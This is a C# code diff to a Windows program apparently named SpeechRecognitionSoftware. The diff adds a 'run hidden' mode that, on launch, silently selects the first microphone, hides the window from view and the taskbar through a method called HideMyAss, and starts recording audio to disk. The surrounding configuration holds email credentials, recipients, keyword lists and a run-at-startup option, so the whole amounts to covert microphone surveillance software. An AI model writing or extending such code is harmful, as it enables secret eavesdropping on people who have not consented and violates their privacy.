@@ -12,7 +12,9 @@ using System.Drawing;
 using System.Net.Mail;
 using System.Windows.Forms;
 using NAudio.Wave;
+using Service;
 using Services;
+using VoiceRecorder.Audio;
 
 namespace SpeechRecognitionSoftware
 {
@@ -23,12 +25,11 @@ namespace SpeechRecognitionSoftware
 	{
 		string to;string cc;string bcc;string subject;string message;string username
 			;string password;string saveFolder;string googleRequestString;string interval;string day
-			;string hour;string minute;string second;string specialWords;bool isAddToStartup;
+			;string hour;string minute;string second;string specialWords;bool isAddToStartup;bool runHidden;
 		int deviceSelected;
 		List<string> list;
 		int index;
 		AudioRecorder recorder;
-		float lastPeak;
 		string fileRecord;
 		public MainForm()
 		{
@@ -42,7 +43,14 @@ namespace SpeechRecognitionSoftware
 		}
 		void MainFormLoad(object sender, EventArgs e)
 		{
-			InItConfiguration();
+			if(Configuration.GetConfiguration().isRunHidden())
+			{
+				Configuration.GetConfiguration().setDeviceSelected(0);
+				HideMyAss();
+				StartRecording();
+			}else{
+				InItConfiguration();
+			}
 		}
 		private void InItConfiguration()
 		{
@@ -52,6 +60,8 @@ namespace SpeechRecognitionSoftware
 			for (int i = 0; i < waveInDevices; i++) {
 				cbRecordingDevice.Items.Add(WaveIn.GetCapabilities(i).ProductName);
 			}
+			if(waveInDevices>0)
+			cbRecordingDevice.SelectedIndex = 0;
 			
 			tbSaveFolder.Text = Configuration.GetConfiguration().getSaveFolder();
 			tbRequestString.Text = Configuration.GetConfiguration().getGoogleRqString();
@@ -259,25 +269,20 @@ namespace SpeechRecognitionSoftware
 				second = tbSecond.Text;
 				isAddToStartup = cbAddToStartup.Checked;
 				deviceSelected = cbRecordingDevice.SelectedIndex;
-				Configuration.GetConfiguration().SaveConfig(to,cc,bcc,
-				                                            subject,message,username,password,saveFolder,
-				                                            googleRequestString,interval,day,hour,minute,second,
-				                                            specialWords,isAddToStartup,deviceSelected);
 				if(deviceSelected == -1)
 				{
 					MessageBox.Show("Not found any recording device!");
 					return;
 				}
-				MessageBox.Show("Save done!");
-				tabControl1.TabPages[0].Enabled =false;
-				tabControl1.SelectedIndex=1;
+				runHidden = cbHidden.Checked;
+				Configuration.GetConfiguration().SaveConfig(to,cc,bcc,
+				                                            subject,message,username,password,saveFolder,
+				                                            googleRequestString,interval,day,hour,minute,second,
+				                                            specialWords,isAddToStartup,runHidden,deviceSelected);
 				
-				
-				fileRecord = Configuration.GetConfiguration().getSaveFolder() + "\\" + String.Format("{0:yyyy-MM-dd-HH-mm-ss}",DateTime.Now)+ ".wav";
-				recorder = new AudioRecorder();
-				recorder.SampleAggregator.MaximumCalculated+=OnRecorderMaximumCalculated;
-				recorder.BeginMonitoring(Configuration.GetConfiguration().getDeviceSelected());
-				recorder.BeginRecording(fileRecord);
+				MessageBox.Show("Save ok,application will run hidden");
+				HideMyAss();
+				StartRecording();
 			}catch(Exception ex)
 			{
 				MessageBox.Show(ex.Message);
@@ -294,13 +299,39 @@ namespace SpeechRecognitionSoftware
 			}
 		}
 		
-		void OnRecorderMaximumCalculated(object sender, MaxSampleEventArgs e)
+		public void StartRecording()
 		{
-			lastPeak = Math.Max(e.MaxSample, Math.Abs(e.MinSample));
-			Utilities.WriteLine(lastPeak.ToString());
-			PeakLevelProgressBar.Value = (int)lastPeak*100;
+			fileRecord = Configuration.GetConfiguration().getSaveFolder() + "\\" + String.Format("{0:yyyy-MM-dd-HH-mm-ss}",DateTime.Now)+ ".wav";
+			recorder = new AudioRecorder();
+			recorder.BeginMonitoring(Configuration.GetConfiguration().getDeviceSelected());
+			recorder.BeginRecording(fileRecord);
+		}
+		void MainFormFormClosing(object sender, FormClosingEventArgs e)
+		{
+			StopAllService();
 		}
 		
+		private void StopAllService()
+		{
+			SpeechRecognitionService.GetSpeechRecognitionService().Stop();
+			ComparationService.GetComparationService().Stop();
+			MailService.GetMailService().Stop();
+			FileDeleteService.GetFileDeleteService().Stop();
+		}
 		
+		#region Hide my ass in background
+		private void HideMyAss()
+		{
+			this.Hide();
+			//
+			this.ShowInTaskbar = false;
+			//not close button
+			this.ControlBox = false;
+			//no form
+			this.Visible = false;
+			//
+			this.SetVisibleCore(false);
+		}
+		#endregion
 	}
 }
